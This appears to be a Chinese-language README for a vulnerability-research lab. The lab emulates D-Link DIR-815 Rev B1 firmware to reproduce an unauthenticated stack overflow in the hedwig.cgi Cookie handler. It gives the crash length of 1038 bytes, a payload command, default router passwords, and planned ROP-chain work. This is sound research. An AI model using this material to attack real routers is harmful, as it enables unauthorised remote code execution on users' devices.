# D-Link DIR-815 固件仿真环境

> **状态：漏洞已复现。** `hedwig.cgi` 的 Cookie 溢出在 Rev B1 固件中实测存在，
> 最小触发长度 **1038 字节**。完整记录见 [docs/repro.md](../../docs/repro.md)。

## 1. 目标设备

| 项目 | 内容 |
|---|---|
| 型号 | D-Link DIR-815（**Rev B1**） |
| 硬件平台 | Ralink **RT3052**（MIPS 24KEc） |
| 固件 | `DIR815_revB_FW_V2.02b01.bin`（4,591,760 B） |
| sha256 | `faaf6c614e615d25be93706195a33b059a23a26192c620d01ef09ede6828d638` |
| 内核 | Linux 2.6.33.2 / gcc 4.3.3 / 2010-10-11 |
| 根文件系统 | squashfs 4.0，**LZMA** 压缩，64 KB 块，1873 inode |
| 架构 | **mipsel**（实测：`ELF 32-bit LSB executable, MIPS`） |
| libc | uClibc 0.9.30.1（`ld-uClibc.so.0`） |

> DIR-815 有多个硬件版本，固件**互不通用**：
>
> | 版本 | 芯片 | 固件头签名 |
> |---|---|---|
> | Rev A1 | Ralink RT3662 | `...dir815a1` |
> | **Rev B1（本环境）** | Ralink RT3052 | `signature=wrgnd12_dlob.hans_dir815b` |
> | Rev E / S / R | Realtek RT8197F/G | 另一套 SDK |
>
> 详细解析见 [docs/firmware-notes.md](../../docs/firmware-notes.md)。

## 2. 漏洞

- **入口**：URL `/hedwig.cgi`，由 `htdocs/cgibin` 按 `REQUEST_URI` 分发，
  实际 handler 是 `hedwigcgi_main`
- **类型**：处理过长 Cookie（`uid=`）时**栈溢出**，可导致远程代码执行
- **前置**：只处理 `POST`，无需认证
- **实测**：Cookie 值 ≥ **1038** 字节 → SIGSEGV；1037 及以下正常

⚠️ **`hedwig.cgi` 在磁盘上并不存在**。这个固件里没有任何 `*.cgi` 文件，
13 个 CGI 入口（`hedwig.cgi`、`session.cgi`、`soap.cgi`、`gena.cgi`、
`fwup.cgi`、`hnap_main`…）都是 `cgibin` 内部的字符串分发。所以本地复现必须同时
伪造 `argv[0]` 和 `REQUEST_URI`，缺一个就会落到别的 handler。

正常的响应（用于确认路由正确）：

```http
HTTP/1.1 200 OK
Content-Type: text/xml

<hedwig><result>FAILED</result><message>no xml data.</message></hedwig>
```

## 3. 目录结构

```
D-Link/DIR-815/
├── README.md
├── firmware/                      # 放固件(不入库)
├── init_env.sh                    # 探测架构 + 生成 .env + 软链 squashfs-root
├── tools/unpack.sh                # 解包(binwalk -> dd+7z)
├── tools/run-local.sh             # 免 docker 免 sudo,直接跑 cgibin
├── tools/poc_hedwig_cookie.py     # 对运行中的设备做存在性验证
├── docker-compose-firmae.yml      # 方式 A:FirmAE(全系统)
├── firmae/{Dockerfile,run.sh}
├── docker-compose-system.yml      # 方式 B:QEMU system(本固件不适用)
├── system-emu/{Dockerfile,run.sh,images/}
├── docker-compose-user.yml        # 方式 C:QEMU user(docker 版)
└── user-emu/{Dockerfile,run.sh}
```

## 4. 快速开始

### 4.1 放固件

```bash
cd D-Link/DIR-815
cp "/mnt/d/资料/fuzz/固件/firmware/D-Link/DIR-815/DIR815_revB_FW_V2.02b01.bin" firmware/
sha256sum firmware/*.bin
```

### 4.2 解包（LZMA squashfs，**必须在 Linux 里解**）

`squashfs 4.0 + LZMA` 标准 `unsquashfs` 不支持；而在 Windows 上用 7-Zip 解，
**会丢掉全部 156 个软链接**（包括 `lib/ld-uClibc.so.0`），后面 qemu 一律报
`No such file or directory`。所以在 ext4 里做：

```bash
mkdir -p ~/work/dir815
tar -xf "<固件目录>/DIR815_revB_FW_V2.02b01.bin_extracted_1779550358.tar" -C ~/work/dir815
# 或者
./tools/unpack.sh
```

解包成功判据：

```bash
find ~/work/dir815/squashfs-root -type l | wc -l   # 应为 156,不是 0
ls -l ~/work/dir815/squashfs-root/lib/ld-uClibc.so.0
```

### 4.3 初始化

```bash
./init_env.sh
#   [*] 架构探测: mipsel  (来自 /htdocs/cgibin)
```

### 4.4 三种仿真方式

| 方式 | 真实度 | 本固件可行性 | 适用 |
|---|---|---|---|
| **A. FirmAE** | 高（全系统 + NVRAM 伪造） | 需能拉镜像 | 要看 Web 后台 |
| B. QEMU system 手动 | 高 | ❌ 板级内核在 malta 上起不来 | 不推荐 |
| **C. QEMU user** | 低（单进程） | ✅ **已验证可用** | 复现溢出、gdb 调栈 |

---

#### 方式 C（推荐先用这个）：免 docker 本地跑

```bash
cd D-Link/DIR-815

# 会自动 apt-get download qemu-user-static 并解出静态二进制(不需要 sudo)
ROOTFS=~/work/dir815/squashfs-root ./tools/run-local.sh

# 不崩的边界
ROOTFS=~/work/dir815/squashfs-root LEN=1037 ./tools/run-local.sh

# 换入口
ROOTFS=~/work/dir815/squashfs-root ENTRY=/session.cgi ./tools/run-local.sh
```

预期看到 `qemu: uncaught target signal 11 (Segmentation fault)` 和 `rc=139`。

用 docker 也行（如果 registry 能访问）：

```bash
docker compose -f docker-compose-user.yml build
docker compose -f docker-compose-user.yml run --rm -e PAYLOAD="$(python3 -c 'print("A"*1038)')" user-emu
```

---

#### 方式 A：FirmAE（全系统，能看到 Web 后台）

```bash
docker compose -f docker-compose-firmae.yml build
docker compose -f docker-compose-firmae.yml run --rm firmae
```

容器内：

```bash
./run.sh -r dlink /firmware/DIR815_revB_FW_V2.02b01.bin
./run.sh -d dlink /firmware/DIR815_revB_FW_V2.02b01.bin   # 调试
```

启动后固件在 `192.168.0.1`（compose 用 `network_mode: host`，直接访问）：

```bash
curl -I http://192.168.0.1/
```

默认口令先试 `admin` + 空密码，再试 `admin/admin`。

> 本环境的 Docker 拉镜像可能被代理 TLS 拦截（`x509: certificate is not valid
> for any names`），遇到就改用方式 C，或给 Docker 配镜像加速/信任证书。

---

## 5. 网络拓扑

```
WSL Ubuntu                     docker(host 网络)              固件
─────────────────────────────────────────────────────────────────────
curl / 浏览器 ─────────────────► FirmAE ── tap ──► 192.168.0.1:80

本地 qemu-user(方式 C) ── 纯本地进程,不需要网络
```

## 6. 排错

| 现象 | 原因 / 处理 |
|---|---|
| `unsquashfs: Unsupported compression type 2` | LZMA squashfs，用 `tools/unpack.sh` 或在 Linux 里解 |
| `find -type l` 结果 0 个 | 在 Windows 用 7z 解的，软链全丢；换 Linux 解包 |
| qemu 报 `No such file or directory` | 缺 `lib/ld-uClibc.so.0` 软链 |
| 跑出来是 `no xml data.` 之外的 XML | 路由落到了别的 handler，检查 `argv[0]` 和 `REQUEST_URI` |
| `qemu: uncaught target signal 11` | 正常，说明溢出了 |
| Docker 拉镜像报 x509 | 代理 TLS 拦截，改用方式 C |

## 7. 参考

- 复现记录（实测数据）：[docs/repro.md](../../docs/repro.md)
- 固件解析记录：[docs/firmware-notes.md](../../docs/firmware-notes.md)
- 《从零开始复现 DIR-815 栈溢出漏洞》：`https://zhuanlan.zhihu.com/p/517019827`
- opencve DIR-815：`https://app.opencve.io/cve/?vendor=dlink&product=dir-815`
- FirmAE：`https://github.com/pr0cf5/FirmAE`

## 8. TODO

- [x] 确认固件版本与架构（Rev B1 / RT3052 / mipsel / LZMA squashfs）
- [x] 确认 `hedwigcgi_main` 存在于 B 版 cgibin
- [x] 用 qemu-user 复现崩溃，定位最小触发长度 1038
- [ ] gdb 精确定位到 `$ra` 的偏移
- [ ] 构造 ROP 链，把"打崩"升级为"命令执行"
- [ ] FirmAE 全系统跑通 + 后台截图
